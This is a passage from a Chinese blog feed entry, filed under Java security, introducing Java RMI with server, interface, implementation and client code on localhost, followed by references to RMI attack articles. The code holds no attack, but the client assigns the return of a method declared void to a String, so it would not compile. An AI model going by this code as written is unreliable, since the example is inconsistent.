class="string">&quot;rmi://&quot;</span> + HOST + <span class="string">&quot;:&quot;</span> + PORT + RMI_PATH;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 注册RMI端口</span></span><br><span class="line">            LocateRegistry.createRegistry(PORT);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建一个服务</span></span><br><span class="line">            <span class="type">Servicetest</span> <span class="variable">servicetest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServicetestImpl</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 服务命名绑定</span></span><br><span class="line">            Naming.rebind(RMI_NAME, servicetest);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;启动RMI服务在&quot;</span> + RMI_NAME);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上述代码中，在8989端口起了RMI服务，以键值对的形式存储了RMI_PATH和rmiInterface的对应关系，也就是rmi://127.0.0.1:8989/hello对应一个ServicetestImpl类实例，然后通过Naming.rebind(RMI_NAME, rmiInterface)绑定对应关系。再来看Servicetest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Servicetest</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义了RMIInterface接口，继承自Remote，然后定义了一个test()方法作为接口。注意需要抛出RemoteException异常。继续看实现真正功能的类ServicetestImpl.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServicetestImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">Servicetest</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">ServicetestImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is a rmi test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>继承自UnicastRemoteObject类，并且实现之前定义的Servicetest接口的test()方法。UnicastRemoteObject类提供了很多支持RMI的方法，具体来说，这些方法可以通过JRMP协议导出一个远程对象的引用，并通过动态代理构建一个可以和远程对象交互的Stub对象。现在就定义好了Server端，来看Client</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.rmi.RmiServer.RMI_NAME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取服务注册器</span></span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8989</span>);</span><br><span class="line">            <span class="comment">// 获取所有注册的服务</span></span><br><span class="line">            String[] list = registry.list();</span><br><span class="line">            <span class="keyword">for</span> (String i : list) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;已经注册的服务：&quot;</span> + i);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 寻找RMI_NAME对应的RMI实例</span></span><br><span class="line">            <span class="type">Servicetest</span> <span class="variable">rt</span> <span class="operator">=</span> (Servicetest) Naming.lookup(RMI_NAME);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用Server的test()方法,并拿到返回值.</span></span><br><span class="line">             <span class="type">String</span> <span class="variable">resultr</span> <span class="operator">=</span> rt.test();</span><br><span class="line">             System.out.println(resultr);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考：<a href="https://su18.org/post/rmi-attack/#2-%E6%94%BB%E5%87%BB-registry-%E7%AB%AF">https://su18.org/post/rmi-attack/#2-%E6%94%BB%E5%87%BB-registry-%E7%AB%AF</a></p><p><a href="https://paper.seebug.org/1091/#java-rmi_2">https://paper.seebug.org/1091/#java-rmi_2</a></p><p><a href="https://xz.aliyun.com/t/7079?time__1311=n4%2BxnD0Dy7itGQNKGNnmAzti%3DDkW3DB7in1oD">https://xz.aliyun.com/t/7079?time__1311=n4%2BxnD0Dy7itGQNKGNnmAzti%3DDkW3DB7in1oD</a></p><p><a href="https://xz.aliyun.com/t/7264?time__1311=n4%2BxnD0Dy7G%3DBxGqGNnmADR7DgDfErrx3%2BBbD#toc-0">https://xz.aliyun.com/t/7264?time__1311=n4%2BxnD0Dy7G%3DBxGqGNnmADR7DgDfErrx3%2BBbD#toc-0</a></p><p><a href="https://su18.org/post/rmi-attack/#2-%E6%94%BB%E5%87%BB-registry-%E7%AB%AF">https://y4er.com/posts/java-rmi/</a></p><p><a href="https://www.javasec.org/javase/RMI/">https://www.javasec.org/javase/RMI/</a></p><p><a href="http://www.mi1k7ea.com/2019/09/01/Java-RMI%E5%8E%9F%E7%90%86%E4%B8%8E%E4%BD%BF%E7%94%A8/">http://www.mi1k7ea.com/2019/09/01/Java-RMI%E5%8E%9F%E7%90%86%E4%B8%8E%E4%BD%BF%E7%94%A8/</a></p><p><a href="https://xz.aliyun.com/t/9261?">https://xz.aliyun.com/t/9261</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/14280278.html">https://www.cnblogs.com/nice0e3/p/14280278.html</a></p><p><a href="https://www.bilibili.com/video/BV1L3411a7ax?p=5&amp;vd_source=82398f68c82cb90e0d9aa4fea90e36a0">https://www.bilibili.com/video/BV1L3411a7ax?p=5&amp;vd_source=82398f68c82cb90e0d9aa4fea90e36a0</a></p><p><a href="https://townmacro.cn/2022/04/18/java-%E5%AE%89%E5%85%A8-rmi%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">https://townmacro.cn/2022/04/18/java-%E5%AE%89%E5%85%A8-rmi%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</a></p><p><a href="https://su18.org/post/rmi-attack/#%E5%9B%9B-%E6%94%BB%E5%87%BB-rmi">https://su18.org/post/rmi-attack/#%E5%9B%9B-%E6%94%BB%E5%87%BB-rmi</a></p><p><a href="https://xz.aliyun.com/t/7079?time__1311=n4%2BxnD0Dy7itGQNKGNnmAzKDtf%3D4AKDkWe6YeD">https://xz.aliyun.com/t/7079?time__1311=n4%2BxnD0Dy7itGQNKGNnmAzKDtf%3D4AKDkWe6YeD</a></p><p><a href="https://paper.seebug.org/1091/#java-rmi_2">https://paper.seebug.org/1091/#java-rmi_2</a></p><p><a href="https://forum.butian.net/share/2278">https://forum.butian.net/share/2278</a></p><p><a href="https://xz.aliyun.com/t/7264?time__1311=n4%2BxnD0Dy7G%3DBxGqGNnmADR7DgDfErrx3%2BBbD#toc-2">https://xz.aliyun.com/t/7264?time__1311=n4%2BxnD0Dy7G%3DBxGqGNnmADR7DgDfErrx3%2BBbD#toc-2</a></p><p><a href="https://townmacro.cn/2022/04/18/java-%E5%AE%89%E5%85%A8-rmi%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">https://townmacro.cn/2022/04/18/java-%E5%AE%89%E5%85%A8-rmi%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</a></p><p><a href="https://lalajun.github.io/2020/06/22/RMI%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%B7%B1%E5%85%A5-%E4%B8%8B/#%E5%89%8D%E8%A8%80">https://lalajun.github.io/2020/06/22/RMI%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%B7%B1%E5%85%A5-%E4%B8%8B/#%E5%89%8D%E8%A8%80</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-简介&quot;&gt;1.简介&lt;/h2&gt;
&lt;p&gt;Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java基础" scheme="https://oceanzbz.github.io/tags/Java%E5%9F%BA%E7%A1%80/"/>
    
    <category term="RMI" scheme="https://oceanzbz.github.io/tags/RMI/"/>
    
  </entry>
  
</feed>
